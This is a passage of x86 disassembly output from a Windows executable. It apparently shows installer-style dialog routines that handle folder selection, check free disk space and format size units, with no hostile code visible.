  40498f:	a1 30 aa 42 00       	mov    0x42aa30,%eax
  404994:	75 05                	jne    0x40499b
  404996:	a1 64 ca 42 00       	mov    0x42ca64,%eax
  40499b:	6a 01                	push   $0x1
  40499d:	6a 01                	push   $0x1
  40499f:	68 f4 00 00 00       	push   $0xf4
  4049a4:	50                   	push   %eax
  4049a5:	ff 15 58 82 40 00    	call   *0x408258
  4049ab:	c3                   	ret
  4049ac:	55                   	push   %ebp
  4049ad:	8b ec                	mov    %esp,%ebp
  4049af:	83 ec 3c             	sub    $0x3c,%esp
  4049b2:	8b 45 08             	mov    0x8(%ebp),%eax
  4049b5:	83 65 d8 00          	andl   $0x0,-0x28(%ebp)
  4049b9:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
  4049bd:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4049c0:	8b 45 0c             	mov    0xc(%ebp),%eax
  4049c3:	c7 45 c8 00 05 00 00 	movl   $0x500,-0x38(%ebp)
  4049ca:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4049cd:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4049d0:	50                   	push   %eax
  4049d1:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  4049d8:	c7 45 d0 8c a3 40 00 	movl   $0x40a38c,-0x30(%ebp)
  4049df:	e8 01 12 00 00       	call   0x405be5
  4049e4:	c9                   	leave
  4049e5:	c2 0c 00             	ret    $0xc
  4049e8:	55                   	push   %ebp
  4049e9:	8b ec                	mov    %esp,%ebp
  4049eb:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  4049f2:	56                   	push   %esi
  4049f3:	8b 75 14             	mov    0x14(%ebp),%esi
  4049f6:	75 26                	jne    0x404a1e
  4049f8:	ff 76 30             	push   0x30(%esi)
  4049fb:	6a 1d                	push   $0x1d
  4049fd:	ff 75 08             	push   0x8(%ebp)
  404a00:	e8 39 fb ff ff       	call   0x40453e
  404a05:	8b 46 3c             	mov    0x3c(%esi),%eax
  404a08:	c1 e0 0b             	shl    $0xb,%eax
  404a0b:	05 00 50 43 00       	add    $0x435000,%eax
  404a10:	50                   	push   %eax
  404a11:	68 e8 03 00 00       	push   $0x3e8
  404a16:	ff 75 08             	push   0x8(%ebp)
  404a19:	e8 df 11 00 00       	call   0x405bfd
  404a1e:	56                   	push   %esi
  404a1f:	ff 75 10             	push   0x10(%ebp)
  404a22:	ff 75 0c             	push   0xc(%ebp)
  404a25:	e8 7b fb ff ff       	call   0x4045a5
  404a2a:	5e                   	pop    %esi
  404a2b:	5d                   	pop    %ebp
  404a2c:	c2 10 00             	ret    $0x10
  404a2f:	55                   	push   %ebp
  404a30:	8b ec                	mov    %esp,%ebp
  404a32:	83 ec 4c             	sub    $0x4c,%esp
  404a35:	a1 40 ba 42 00       	mov    0x42ba40,%eax
  404a3a:	53                   	push   %ebx
  404a3b:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404a3e:	56                   	push   %esi
  404a3f:	8b 58 3c             	mov    0x3c(%eax),%ebx
  404a42:	8b 40 38             	mov    0x38(%eax),%eax
  404a45:	c1 e3 0b             	shl    $0xb,%ebx
  404a48:	81 c3 00 50 43 00    	add    $0x435000,%ebx
  404a4e:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404a55:	57                   	push   %edi
  404a56:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404a59:	75 11                	jne    0x404a6c
  404a5b:	53                   	push   %ebx
  404a5c:	68 fb 03 00 00       	push   $0x3fb
  404a61:	e8 9d 11 00 00       	call   0x405c03
  404a66:	53                   	push   %ebx
  404a67:	e8 01 1e 00 00       	call   0x40686d
  404a6c:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404a73:	8b 75 08             	mov    0x8(%ebp),%esi
  404a76:	75 6c                	jne    0x404ae4
  404a78:	68 fb 03 00 00       	push   $0x3fb
  404a7d:	56                   	push   %esi
  404a7e:	ff 15 3c 82 40 00    	call   *0x40823c
  404a84:	53                   	push   %ebx
  404a85:	8b f8                	mov    %eax,%edi
  404a87:	e8 79 14 00 00       	call   0x405f05
  404a8c:	85 c0                	test   %eax,%eax
  404a8e:	74 10                	je     0x404aa0
  404a90:	53                   	push   %ebx
  404a91:	e8 a3 14 00 00       	call   0x405f39
  404a96:	85 c0                	test   %eax,%eax
  404a98:	75 06                	jne    0x404aa0
  404a9a:	53                   	push   %ebx
  404a9b:	e8 ee 13 00 00       	call   0x405e8e
  404aa0:	53                   	push   %ebx
  404aa1:	57                   	push   %edi
  404aa2:	89 35 d8 36 43 00    	mov    %esi,0x4336d8
  404aa8:	ff 15 1c 82 40 00    	call   *0x40821c
  404aae:	8b 45 14             	mov    0x14(%ebp),%eax
  404ab1:	ff 70 34             	push   0x34(%eax)
  404ab4:	6a 01                	push   $0x1
  404ab6:	56                   	push   %esi
  404ab7:	e8 82 fa ff ff       	call   0x40453e
  404abc:	8b 45 14             	mov    0x14(%ebp),%eax
  404abf:	ff 70 30             	push   0x30(%eax)
  404ac2:	6a 14                	push   $0x14
  404ac4:	56                   	push   %esi
  404ac5:	e8 74 fa ff ff       	call   0x40453e
  404aca:	57                   	push   %edi
  404acb:	e8 a3 fa ff ff       	call   0x404573
  404ad0:	6a 09                	push   $0x9
  404ad2:	e8 dc 1e 00 00       	call   0x4069b3
  404ad7:	85 c0                	test   %eax,%eax
  404ad9:	0f 84 91 02 00 00    	je     0x404d70
  404adf:	6a 01                	push   $0x1
  404ae1:	57                   	push   %edi
  404ae2:	ff d0                	call   *%eax
  404ae4:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404aeb:	0f 85 d1 00 00 00    	jne    0x404bc2
  404af1:	0f b7 45 10          	movzwl 0x10(%ebp),%eax
  404af5:	3d fb 03 00 00       	cmp    $0x3fb,%eax
  404afa:	75 18                	jne    0x404b14
  404afc:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404aff:	c1 e9 10             	shr    $0x10,%ecx
  404b02:	66 81 f9 00 03       	cmp    $0x300,%cx
  404b07:	0f 85 63 02 00 00    	jne    0x404d70
  404b0d:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404b14:	3d e9 03 00 00       	cmp    $0x3e9,%eax
  404b19:	0f 85 a3 00 00 00    	jne    0x404bc2
  404b1f:	6a 07                	push   $0x7
  404b21:	33 c0                	xor    %eax,%eax
  404b23:	59                   	pop    %ecx
  404b24:	8d 7d b8             	lea    -0x48(%ebp),%edi
  404b27:	ff 75 f8             	push   -0x8(%ebp)
  404b2a:	f3 ab                	rep stos %eax,%es:(%edi)
  404b2c:	bf 68 ca 42 00       	mov    $0x42ca68,%edi
  404b31:	68 40 b2 42 00       	push   $0x42b240
  404b36:	89 75 b4             	mov    %esi,-0x4c(%ebp)
  404b39:	89 7d bc             	mov    %edi,-0x44(%ebp)
  404b3c:	c7 45 c8 85 4d 40 00 	movl   $0x404d85,-0x38(%ebp)
  404b43:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  404b46:	e8 b1 1a 00 00       	call   0x4065fc
  404b4b:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404b4e:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  404b51:	50                   	push   %eax
  404b52:	c7 45 c4 41 00 00 00 	movl   $0x41,-0x3c(%ebp)
  404b59:	ff 15 78 81 40 00    	call   *0x408178
  404b5f:	85 c0                	test   %eax,%eax
  404b61:	74 58                	je     0x404bbb
  404b63:	50                   	push   %eax
  404b64:	ff 15 a0 82 40 00    	call   *0x4082a0
  404b6a:	53                   	push   %ebx
  404b6b:	e8 1e 13 00 00       	call   0x405e8e
  404b70:	a1 10 47 43 00       	mov    0x434710,%eax
  404b75:	8b 80 1c 01 00 00    	mov    0x11c(%eax),%eax
  404b7b:	85 c0                	test   %eax,%eax
  404b7d:	74 28                	je     0x404ba7
  404b7f:	81 fb 00 f8 43 00    	cmp    $0x43f800,%ebx
  404b85:	75 20                	jne    0x404ba7
  404b87:	50                   	push   %eax
  404b88:	6a 00                	push   $0x0
  404b8a:	e8 6d 1a 00 00       	call   0x4065fc
  404b8f:	57                   	push   %edi
  404b90:	bf a0 26 43 00       	mov    $0x4326a0,%edi
  404b95:	57                   	push   %edi
  404b96:	ff 15 00 81 40 00    	call   *0x408100
  404b9c:	85 c0                	test   %eax,%eax
  404b9e:	74 07                	je     0x404ba7
  404ba0:	57                   	push   %edi
  404ba1:	53                   	push   %ebx
  404ba2:	e8 34 1a 00 00       	call   0x4065db
  404ba7:	ff 05 58 ca 42 00    	incl   0x42ca58
  404bad:	53                   	push   %ebx
  404bae:	68 fb 03 00 00       	push   $0x3fb
  404bb3:	56                   	push   %esi
  404bb4:	e8 44 10 00 00       	call   0x405bfd
  404bb9:	eb 07                	jmp    0x404bc2
  404bbb:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404bc2:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  404bc9:	74 0d                	je     0x404bd8
  404bcb:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  404bd2:	0f 85 98 01 00 00    	jne    0x404d70
  404bd8:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404bdc:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  404be0:	53                   	push   %ebx
  404be1:	68 fb 03 00 00       	push   $0x3fb
  404be6:	e8 18 10 00 00       	call   0x405c03
  404beb:	53                   	push   %ebx
  404bec:	e8 a5 13 00 00       	call   0x405f96
  404bf1:	85 c0                	test   %eax,%eax
  404bf3:	75 07                	jne    0x404bfc
  404bf5:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  404bfc:	be 38 aa 42 00       	mov    $0x42aa38,%esi
  404c01:	53                   	push   %ebx
  404c02:	56                   	push   %esi
  404c03:	e8 b7 19 00 00       	call   0x4065bf
  404c08:	6a 01                	push   $0x1
  404c0a:	e8 a4 1d 00 00       	call   0x4069b3
  404c0f:	85 c0                	test   %eax,%eax
  404c11:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404c14:	74 3a                	je     0x404c50
  404c16:	33 c0                	xor    %eax,%eax
  404c18:	33 ff                	xor    %edi,%edi
  404c1a:	3b c6                	cmp    %esi,%eax
  404c1c:	74 32                	je     0x404c50
  404c1e:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404c21:	50                   	push   %eax
  404c22:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404c25:	50                   	push   %eax
  404c26:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404c29:	50                   	push   %eax
  404c2a:	56                   	push   %esi
  404c2b:	ff 55 f4             	call   *-0xc(%ebp)
  404c2e:	85 c0                	test   %eax,%eax
  404c30:	75 76                	jne    0x404ca8
  404c32:	85 ff                	test   %edi,%edi
  404c34:	74 03                	je     0x404c39
  404c36:	66 21 07             	and    %ax,(%edi)
  404c39:	56                   	push   %esi
  404c3a:	e8 9b 12 00 00       	call   0x405eda
  404c3f:	8b f8                	mov    %eax,%edi
  404c41:	66 83 27 00          	andw   $0x0,(%edi)
  404c45:	4f                   	dec    %edi
  404c46:	4f                   	dec    %edi
  404c47:	3b fe                	cmp    %esi,%edi
  404c49:	66 c7 07 5c 00       	movw   $0x5c,(%edi)
  404c4e:	75 ce                	jne    0x404c1e
  404c50:	53                   	push   %ebx
  404c51:	56                   	push   %esi
  404c52:	e8 68 19 00 00       	call   0x4065bf
  404c57:	56                   	push   %esi
  404c58:	e8 dc 12 00 00       	call   0x405f39
  404c5d:	33 ff                	xor    %edi,%edi
  404c5f:	3b c7                	cmp    %edi,%eax
  404c61:	74 03                	je     0x404c66
  404c63:	66 89 38             	mov    %di,(%eax)
  404c66:	8d 45 e0             	lea    -0x20(%ebp),%eax
  404c69:	50                   	push   %eax
  404c6a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404c6d:	50                   	push   %eax
  404c6e:	8d 45 ec             	lea    -0x14(%ebp),%eax
  404c71:	50                   	push   %eax
  404c72:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404c75:	50                   	push   %eax
  404c76:	56                   	push   %esi
  404c77:	ff 15 90 80 40 00    	call   *0x408090
  404c7d:	85 c0                	test   %eax,%eax
  404c7f:	74 43                	je     0x404cc4
  404c81:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404c84:	be 00 04 00 00       	mov    $0x400,%esi
  404c89:	0f af 45 ec          	imul   -0x14(%ebp),%eax
  404c8d:	56                   	push   %esi
  404c8e:	ff 75 f4             	push   -0xc(%ebp)
  404c91:	50                   	push   %eax
  404c92:	ff 15 48 81 40 00    	call   *0x408148
  404c98:	99                   	cltd
  404c99:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404c9c:	89 55 d8             	mov    %edx,-0x28(%ebp)
  404c9f:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404ca6:	eb 21                	jmp    0x404cc9
  404ca8:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  404cab:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  404cae:	0f ac c8 0a          	shrd   $0xa,%ecx,%eax
  404cb2:	c1 e9 0a             	shr    $0xa,%ecx
  404cb5:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404cb8:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  404cbb:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404cc2:	33 ff                	xor    %edi,%edi
  404cc4:	be 00 04 00 00       	mov    $0x400,%esi
  404cc9:	6a 05                	push   $0x5
  404ccb:	e8 fc 01 00 00       	call   0x404ecc
  404cd0:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404cd3:	74 19                	je     0x404cee
  404cd5:	8b 55 d8             	mov    -0x28(%ebp),%edx
  404cd8:	33 c9                	xor    %ecx,%ecx
  404cda:	3b d1                	cmp    %ecx,%edx
  404cdc:	77 10                	ja     0x404cee
  404cde:	72 07                	jb     0x404ce7
  404ce0:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  404ce3:	3b c8                	cmp    %eax,%ecx
  404ce5:	73 07                	jae    0x404cee
  404ce7:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  404cee:	8b 0d dc 36 43 00    	mov    0x4336dc,%ecx
  404cf4:	39 79 10             	cmp    %edi,0x10(%ecx)
  404cf7:	74 30                	je     0x404d29
  404cf9:	50                   	push   %eax
  404cfa:	6a fb                	push   $0xfffffffb
  404cfc:	68 ff 03 00 00       	push   $0x3ff
  404d01:	e8 ae 01 00 00       	call   0x404eb4
  404d06:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404d09:	74 10                	je     0x404d1b
  404d0b:	ff 75 d8             	push   -0x28(%ebp)
  404d0e:	ff 75 d4             	push   -0x2c(%ebp)
  404d11:	6a fc                	push   $0xfffffffc
  404d13:	56                   	push   %esi
  404d14:	e8 d2 00 00 00       	call   0x404deb
  404d19:	eb 0e                	jmp    0x404d29
  404d1b:	68 28 aa 42 00       	push   $0x42aa28
  404d20:	56                   	push   %esi
  404d21:	ff 75 08             	push   0x8(%ebp)
  404d24:	e8 d4 0e 00 00       	call   0x405bfd
  404d29:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404d2c:	3b c7                	cmp    %edi,%eax
  404d2e:	a3 a4 47 43 00       	mov    %eax,0x4347a4
  404d33:	75 0a                	jne    0x404d3f
  404d35:	6a 07                	push   $0x7
  404d37:	e8 cf c6 ff ff       	call   0x40140b
  404d3c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404d3f:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404d42:	85 70 14             	test   %esi,0x14(%eax)
  404d45:	74 03                	je     0x404d4a
  404d47:	89 7d fc             	mov    %edi,-0x4(%ebp)
  404d4a:	33 c0                	xor    %eax,%eax
  404d4c:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  404d4f:	0f 94 c0             	sete   %al
  404d52:	50                   	push   %eax
  404d53:	e8 08 f8 ff ff       	call   0x404560
  404d58:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  404d5b:	75 0d                	jne    0x404d6a
  404d5d:	39 3d 58 ca 42 00    	cmp    %edi,0x42ca58
  404d63:	75 05                	jne    0x404d6a
  404d65:	e8 1e fc ff ff       	call   0x404988
  404d6a:	89 3d 58 ca 42 00    	mov    %edi,0x42ca58
  404d70:	ff 75 14             	push   0x14(%ebp)
  404d73:	ff 75 10             	push   0x10(%ebp)
  404d76:	ff 75 0c             	push   0xc(%ebp)
  404d79:	e8 27 f8 ff ff       	call   0x4045a5
  404d7e:	5f                   	pop    %edi
  404d7f:	5e                   	pop    %esi
  404d80:	5b                   	pop    %ebx
  404d81:	c9                   	leave
  404d82:	c2 10 00             	ret    $0x10
  404d85:	55                   	push   %ebp
  404d86:	8b ec                	mov    %esp,%ebp
  404d88:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  404d8c:	56                   	push   %esi
  404d8d:	8b 35 58 82 40 00    	mov    0x408258,%esi
  404d93:	75 1c                	jne    0x404db1
  404d95:	ff 75 14             	push   0x14(%ebp)
  404d98:	68 fb 03 00 00       	push   $0x3fb
  404d9d:	e8 61 0e 00 00       	call   0x405c03
  404da2:	ff 75 14             	push   0x14(%ebp)
  404da5:	6a 01                	push   $0x1
  404da7:	68 67 04 00 00       	push   $0x467
  404dac:	ff 75 08             	push   0x8(%ebp)
  404daf:	ff d6                	call   *%esi
  404db1:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  404db5:	75 2d                	jne    0x404de4
  404db7:	ff 75 14             	push   0x14(%ebp)
  404dba:	ff 75 10             	push   0x10(%ebp)
  404dbd:	ff 15 74 81 40 00    	call   *0x408174
  404dc3:	85 c0                	test   %eax,%eax
  404dc5:	74 0e                	je     0x404dd5
  404dc7:	6a 07                	push   $0x7
  404dc9:	e8 3d c6 ff ff       	call   0x40140b
  404dce:	85 c0                	test   %eax,%eax
  404dd0:	75 03                	jne    0x404dd5
  404dd2:	40                   	inc    %eax
  404dd3:	eb 02                	jmp    0x404dd7
  404dd5:	33 c0                	xor    %eax,%eax
  404dd7:	50                   	push   %eax
  404dd8:	6a 00                	push   $0x0
  404dda:	68 65 04 00 00       	push   $0x465
  404ddf:	ff 75 08             	push   0x8(%ebp)
  404de2:	ff d6                	call   *%esi
  404de4:	33 c0                	xor    %eax,%eax
  404de6:	5e                   	pop    %esi
  404de7:	5d                   	pop    %ebp
  404de8:	c2 10 00             	ret    $0x10
  404deb:	55                   	push   %ebp
  404dec:	8b ec                	mov    %esp,%ebp
  404dee:	81 ec 80 00 00 00    	sub    $0x80,%esp
  404df4:	8b 45 14             	mov    0x14(%ebp),%eax
  404df7:	53                   	push   %ebx
  404df8:	56                   	push   %esi
  404df9:	8b 75 10             	mov    0x10(%ebp),%esi
  404dfc:	57                   	push   %edi
  404dfd:	6a dc                	push   $0xffffffdc
  404dff:	85 c0                	test   %eax,%eax
  404e01:	5b                   	pop    %ebx
  404e02:	74 0b                	je     0x404e0f
  404e04:	0f ac c6 14          	shrd   $0x14,%eax,%esi
  404e08:	c1 e8 14             	shr    $0x14,%eax
  404e0b:	33 ff                	xor    %edi,%edi
  404e0d:	eb 4e                	jmp    0x404e5d
  404e0f:	6a 14                	push   $0x14
  404e11:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  404e17:	59                   	pop    %ecx
  404e18:	8b c6                	mov    %esi,%eax
  404e1a:	73 06                	jae    0x404e22
  404e1c:	6a 0a                	push   $0xa
  404e1e:	59                   	pop    %ecx
  404e1f:	6a dd                	push   $0xffffffdd
  404e21:	5b                   	pop    %ebx
  404e22:	81 fe 00 04 00 00    	cmp    $0x400,%esi
  404e28:	73 05                	jae    0x404e2f
  404e2a:	6a de                	push   $0xffffffde
  404e2c:	33 c9                	xor    %ecx,%ecx
  404e2e:	5b                   	pop    %ebx
  404e2f:	81 fe 33 33 ff ff    	cmp    $0xffff3333,%esi
  404e35:	73 0d                	jae    0x404e44
  404e37:	33 c0                	xor    %eax,%eax
  404e39:	6a 14                	push   $0x14
  404e3b:	40                   	inc    %eax
  404e3c:	5f                   	pop    %edi
  404e3d:	d3 e0                	shl    %cl,%eax
  404e3f:	99                   	cltd
  404e40:	f7 ff                	idiv   %edi
  404e42:	03 c6                	add    %esi,%eax
  404e44:	8b f0                	mov    %eax,%esi
  404e46:	25 ff ff ff 00       	and    $0xffffff,%eax
  404e4b:	6a 0a                	push   $0xa
  404e4d:	33 d2                	xor    %edx,%edx
  404e4f:	8d 04 80             	lea    (%eax,%eax,4),%eax
  404e52:	03 c0                	add    %eax,%eax
  404e54:	d3 e8                	shr    %cl,%eax
  404e56:	d3 ee                	shr    %cl,%esi
  404e58:	59                   	pop    %ecx
  404e59:	f7 f1                	div    %ecx
  404e5b:	8b fa                	mov    %edx,%edi
  404e5d:	8d 45 c0             	lea    -0x40(%ebp),%eax
  404e60:	6a df                	push   $0xffffffdf
  404e62:	50                   	push   %eax
  404e63:	e8 94 17 00 00       	call   0x4065fc
  404e68:	50                   	push   %eax
  404e69:	8d 45 80             	lea    -0x80(%ebp),%eax
  404e6c:	53                   	push   %ebx
  404e6d:	50                   	push   %eax
  404e6e:	e8 89 17 00 00       	call   0x4065fc
  404e73:	50                   	push   %eax
  404e74:	57                   	push   %edi
  404e75:	56                   	push   %esi
  404e76:	68 98 a3 40 00       	push   $0x40a398
  404e7b:	ff 75 0c             	push   0xc(%ebp)
  404e7e:	be 68 ca 42 00       	mov    $0x42ca68,%esi
  404e83:	56                   	push   %esi
  404e84:	e8 73 17 00 00       	call   0x4065fc
  404e89:	56                   	push   %esi
  404e8a:	8b f8                	mov    %eax,%edi
  404e8c:	e8 44 17 00 00       	call   0x4065d5
  404e91:	8d 04 47             	lea    (%edi,%eax,2),%eax
  404e94:	50                   	push   %eax
  404e95:	ff 15 2c 82 40 00    	call   *0x40822c
  404e9b:	83 c4 18             	add    $0x18,%esp
  404e9e:	56                   	push   %esi
  404e9f:	ff 75 08             	push   0x8(%ebp)
  404ea2:	ff 35 d8 36 43 00    	push   0x4336d8
  404ea8:	e8 50 0d 00 00       	call   0x405bfd
  404ead:	5f                   	pop    %edi
  404eae:	5e                   	pop    %esi
  404eaf:	5b                   	pop    %ebx
  404eb0:	c9                   	leave
  404eb1:	c2 10 00             	ret    $0x10
  404eb4:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404eb8:	33 c9                	xor    %ecx,%ecx
  404eba:	51                   	push   %ecx
  404ebb:	50                   	push   %eax
  404ebc:	ff 74 24 10          	push   0x10(%esp)
  404ec0:	ff 74 24 10          	push   0x10(%esp)
  404ec4:	e8 22 ff ff ff       	call   0x404deb
  404ec9:	c2 0c 00             	ret    $0xc
  404ecc:	8b 15 2c 47 43 00    	mov    0x43472c,%edx
  404ed2:	8b 0d 28 47 43 00    	mov    0x434728,%ecx
  404ed8:	33 c0                	xor    %eax,%eax
  404eda:	85 d2                	test   %edx,%edx
  404edc:	74 18                	je     0x404ef6
  404ede:	56                   	push   %esi
  404edf:	f6 41 08 01          	testb  $0x1,0x8(%ecx)
  404ee3:	74 07                	je     0x404eec
  404ee5:	8b 74 24 08          	mov    0x8(%esp),%esi
  404ee9:	03 04 b1             	add    (%ecx,%esi,4),%eax
  404eec:	81 c1 18 08 00 00    	add    $0x818,%ecx
  404ef2:	4a                   	dec    %edx
  404ef3:	75 ea                	jne    0x404edf
  404ef5:	5e                   	pop    %esi
  404ef6:	c2 04 00             	ret    $0x4
  404ef9:	55                   	push   %ebp
  404efa:	8b ec                	mov    %esp,%ebp
  404efc:	83 ec 38             	sub    $0x38,%esp
  404eff:	56                   	push   %esi
  404f00:	8b 35 58 82 40 00    	mov    0x408258,%esi
  404f06:	57                   	push   %edi
  404f07:	8b 7d 08             	mov    0x8(%ebp),%edi
  404f0a:	6a 00                	push   $0x0
  404f0c:	6a 09                	push   $0x9
  404f0e:	68 0a 11 00 00       	push   $0x110a
  404f13:	57                   	push   %edi
  404f14:	ff d6                	call   *%esi
  404f16:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  404f1a:	74 3c                	je     0x404f58
  404f1c:	ff 15 bc 81 40 00    	call   *0x4081bc
  404f22:	0f bf c8             	movswl %ax,%ecx
  404f25:	c1 e8 10             	shr    $0x10,%eax
  404f28:	0f bf c0             	movswl %ax,%eax
  404f2b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404f2e:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404f31:	50                   	push   %eax
  404f32:	57                   	push   %edi
  404f33:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  404f36:	ff 15 ec 81 40 00    	call   *0x4081ec
  404f3c:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404f3f:	50                   	push   %eax
  404f40:	6a 00                	push   $0x0
  404f42:	68 11 11 00 00       	push   $0x1111
  404f47:	57                   	push   %edi
  404f48:	ff d6                	call   *%esi
  404f4a:	f6 45 f8 66          	testb  $0x66,-0x8(%ebp)
  404f4e:	75 05                	jne    0x404f55
  404f50:	83 c8 ff             	or     $0xffffffff,%eax
  404f53:	eb 1e                	jmp    0x404f73
  404f55:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404f58:	89 45 cc             	mov    %eax,-0x34(%ebp)
  404f5b:	8d 45 c8             	lea    -0x38(%ebp),%eax
  404f5e:	50                   	push   %eax
  404f5f:	6a 00                	push   $0x0
  404f61:	68 3e 11 00 00       	push   $0x113e
  404f66:	57                   	push   %edi
  404f67:	c7 45 c8 04 00 00 00 	movl   $0x4,-0x38(%ebp)
  404f6e:	ff d6                	call   *%esi
  404f70:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404f73:	5f                   	pop    %edi
  404f74:	5e                   	pop    %esi
  404f75:	c9                   	leave
  404f76:	c2 08 00             	ret    $0x8
  404f79:	56                   	push   %esi
  404f7a:	57                   	push   %edi
  404f7b:	be 00 50 43 00       	mov    $0x435000,%esi
  404f80:	bf 68 ca 42 00       	mov    $0x42ca68,%edi
  404f85:	56                   	push   %esi
  404f86:	57                   	push   %edi
  404f87:	e8 33 16 00 00       	call   0x4065bf
  404f8c:	ff 74 24 10          	push   0x10(%esp)
  404f90:	56                   	push   %esi
  404f91:	e8 70 15 00 00       	call   0x406506
  404f96:	ff 74 24 0c          	push   0xc(%esp)
  404f9a:	e8 6c c4 ff ff       	call   0x40140b
  404f9f:	57                   	push   %edi
  404fa0:	56                   	push   %esi
  404fa1:	e8 19 16 00 00       	call   0x4065bf
  404fa6:	5f                   	pop    %edi
  404fa7:	5e                   	pop    %esi
  404fa8:	c2 08 00             	ret    $0x8
  404fab:	55                   	push   %ebp
  404fac:	8b ec                	mov    %esp,%ebp
  404fae:	83 ec 54             	sub    $0x54,%esp
  404fb1:	53                   	push   %ebx
  404fb2:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404fb5:	56                   	push   %esi
  404fb6:	8b 35 3c 82 40 00    	mov    0x40823c,%esi
  404fbc:	57                   	push   %edi
  404fbd:	68 f9 03 00 00       	push   $0x3f9
  404fc2:	53                   	push   %ebx
  404fc3:	ff d6                	call   *%esi
  404fc5:	68 08 04 00 00       	push   $0x408
  404fca:	53                   	push   %ebx
  404fcb:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404fce:	ff d6                	call   *%esi
  404fd0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404fd3:	a1 28 47 43 00       	mov    0x434728,%eax
  404fd8:	8b 35 58 82 40 00    	mov    0x408258,%esi
  404fde:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404fe1:	a1 10 47 43 00       	mov    0x434710,%eax
  404fe6:	33 ff                	xor    %edi,%edi
  404fe8:	05 94 00 00 00       	add    $0x94,%eax
  404fed:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404ff4:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404ff7:	0f 85 25 02 00 00    	jne    0x405222
  404ffd:	a1 2c 47 43 00       	mov    0x43472c,%eax
  405002:	89 7d e0             	mov    %edi,-0x20(%ebp)
  405005:	c1 e0 02             	shl    $0x2,%eax
  405008:	50                   	push   %eax
  405009:	6a 40                	push   $0x40
  40500b:	c7 45 f0 02 00 00 00 	movl   $0x2,-0x10(%ebp)
  405012:	89 1d 60 47 43 00    	mov    %ebx,0x434760
  405018:	ff 15 10 81 40 00    	call   *0x408110
  40501e:	57                   	push   %edi
  40501f:	57                   	push   %edi
  405020:	57                   	push   %edi
  405021:	57                   	push   %edi
  405022:	6a 6e                	push   $0x6e
  405024:	a3 60 ca 42 00       	mov    %eax,0x42ca60
  405029:	ff 35 00 47 43 00    	push   0x434700
  40502f:	ff 15 44 82 40 00    	call   *0x408244
  405035:	83 0d 54 ca 42 00 ff 	orl    $0xffffffff,0x42ca54
  40503c:	68 b8 55 40 00       	push   $0x4055b8
  405041:	6a fc                	push   $0xfffffffc
  405043:	8b d8                	mov    %eax,%ebx
  405045:	ff 75 fc             	push   -0x4(%ebp)
  405048:	ff 15 40 82 40 00    	call   *0x408240
  40504e:	57                   	push   %edi
  40504f:	6a 06                	push   $0x6
  405051:	6a 21                	push   $0x21
  405053:	6a 10                	push   $0x10
  405055:	6a 10                	push   $0x10
  405057:	a3 5c ca 42 00       	mov    %eax,0x42ca5c
  40505c:	ff 15 40 80 40 00    	call   *0x408040
  405062:	68 ff 00 ff 00       	push   $0xff00ff
  405067:	53                   	push   %ebx
  405068:	50                   	push   %eax
  405069:	a3 4c ca 42 00       	mov    %eax,0x42ca4c
  40506e:	ff 15 3c 80 40 00    	call   *0x40803c
